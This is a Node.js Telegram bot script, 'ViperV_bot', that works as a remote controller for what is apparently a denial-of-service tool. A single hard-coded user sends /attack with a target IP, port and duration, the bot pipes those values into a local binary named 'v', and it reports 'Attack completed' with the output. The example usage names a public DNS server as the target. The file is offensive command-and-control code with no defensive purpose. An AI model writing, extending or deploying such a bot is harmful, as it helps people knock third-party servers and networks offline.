const { Telegraf } = require('telegraf');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const bot = new Telegraf(process.env.BOT_TOKEN);
const BINARY_PATH = path.join(__dirname, 'v');
const ALLOWED_USER_ID = '8743980380';

// Make sure binary is executable
if (fs.existsSync(BINARY_PATH)) {
  fs.chmodSync(BINARY_PATH, '755');
  console.log('✅ Binary ready');
}

bot.command('attack', async (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  
  const args = ctx.message.text.split(' ');
  if (args.length < 4) {
    return ctx.reply('Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 8.8.8.8 80 10');
  }
  
  const ip = args[1];
  const port = args[2];
  const duration = args[3];
  
  await ctx.reply(`🎯 Attacking ${ip}:${port} for ${duration}s\n⏳ Starting...`);
  
  // Spawn the process
  const process = spawn(BINARY_PATH);
  
  let output = '';
  let step = 0;
  
  process.stdout.on('data', (data) => {
    const text = data.toString();
    output += text;
    
    // Send inputs one by one when prompted
    if (text.includes('Enter target IP address') || text.includes('IP')) {
      process.stdin.write(ip + '\n');
      step = 1;
    } else if (text.includes('port') || text.includes('PORT')) {
      process.stdin.write(port + '\n');
      step = 2;
    } else if (text.includes('duration') || text.includes('time')) {
      process.stdin.write(duration + '\n');
      step = 3;
    }
  });
  
  process.stderr.on('data', (data) => {
    output += data.toString();
  });
  
  process.on('close', (code) => {
    ctx.reply(`✅ Attack completed\n📤 Output:\n${output.slice(0, 3900) || 'Attack finished'}`);
  });
  
  // Timeout protection
  setTimeout(() => {
    if (!process.killed) {
      process.kill();
      ctx.reply('⚠️ Attack timed out');
    }
  }, duration * 1000 + 10000);
});

bot.command('status', async (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  
  if (fs.existsSync(BINARY_PATH)) {
    const stats = fs.statSync(BINARY_PATH);
    ctx.reply(`✅ Binary ready\n📦 Size: ${(stats.size / 1024).toFixed(2)} KB`);
  } else {
    ctx.reply('❌ Binary not found');
  }
});

bot.command('start', (ctx) => {
  if (ctx.from.id.toString() !== ALLOWED_USER_ID) return;
  ctx.reply('🔷 ViperV_bot ready!\nUse /attack <IP> <PORT> <DURATION>\nUse /status to check binary');
});

bot.launch();
console.log('ViperV_bot started');
